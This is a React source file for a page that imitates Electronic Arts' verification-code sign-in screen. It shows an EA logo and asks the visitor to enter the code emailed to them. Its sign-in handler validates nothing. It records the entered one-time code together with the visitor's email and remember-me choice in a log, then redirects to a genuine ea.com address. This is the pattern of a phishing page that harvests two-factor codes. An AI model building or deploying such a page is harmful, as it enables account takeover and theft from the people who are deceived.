import React, { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { ArrowLeft } from 'lucide-react'
import EALogo from './EALogo'
import { appendLog, getLastEmail } from '../utils/logger'
import { maskEmail } from '../utils/emailMask'

const CodeEntryScreen: React.FC = () => {
  const navigate = useNavigate()
  const [code, setCode] = useState('')
  const [remember, setRemember] = useState(false)

  const masked = maskEmail(getLastEmail())

  const handleBack = () => {
    navigate('/verify')
  }

  const handleSignIn = () => {
    console.log('Sign in clicked', { code, remember })
    appendLog({ page: 'code', code, email: getLastEmail() || undefined, rememberMe: remember })
    window.location.href = 'http://ea.com/twitchlinking'
  }

  return (
    <div className="max-w-[36rem] mx-auto bg-transparent min-h-screen relative">
      {/* Header with Back Button */}
      <div className="px-6 pt-12">
        <button
          onClick={handleBack}
          className="flex items-center space-x-2 text-white bg-slate-700 hover:bg-slate-600 px-4 py-2 rounded-lg transition-colors"
        >
          <ArrowLeft size={20} />
          <span className="font-medium tracking-wider">BACK</span>
        </button>
      </div>

      {/* Main Content */}
      <div className="px-6 pt-8">
        {/* EA Logo */}
        <div className="w-full flex justify-center mb-10">
          <EALogo />
        </div>

        {/* Title */}
        <h1 className="text-2xl font-semibold text-white text-center mb-4">Enter your code</h1>

        {/* Description */}
        <div className="text-center mb-8">
          <p className="text-gray-300 text-base">
            {masked
              ? `we sent your verification code to ${masked}. Enter your code below.`
              : 'we sent your verification code to your email. Enter your code below.'}
          </p>
        </div>

        {/* Code input */}
        <div className="mb-6">
          <input
            type="text"
            inputMode="numeric"
            autoComplete="one-time-code"
            maxLength={6}
            value={code}
            onChange={(e) => setCode(e.target.value.replace(/[^0-9]/g, ''))}
            placeholder="Code"
            className="w-full bg-slate-800 text-white placeholder-slate-400 border border-slate-600 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/40 outline-none rounded-xl px-4 py-3 text-lg tracking-widest text-center"
          />
        </div>

        {/* Remember this device */}
        <label className="flex items-center gap-3 mb-8 select-none">
          <input
            type="checkbox"
            checked={remember}
            onChange={(e) => setRemember(e.target.checked)}
            className="h-5 w-5 rounded border-slate-600 text-blue-600 focus:ring-blue-500"
          />
          <span className="text-slate-200">remember this device</span>
        </label>

        {/* Sign In Button */}
        <button
          onClick={handleSignIn}
          className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-4 rounded-xl transition-colors text-lg tracking-wider"
          disabled={code.length === 0}
        >
          sign in
        </button>

        {/* Helper text */}
        <p className="text-gray-400 text-sm text-center mt-6">
          if you don't see the email in your inbox, check your spam folder and promotions tab.
        </p>
      </div>
    </div>
  )
}

export default CodeEntryScreen
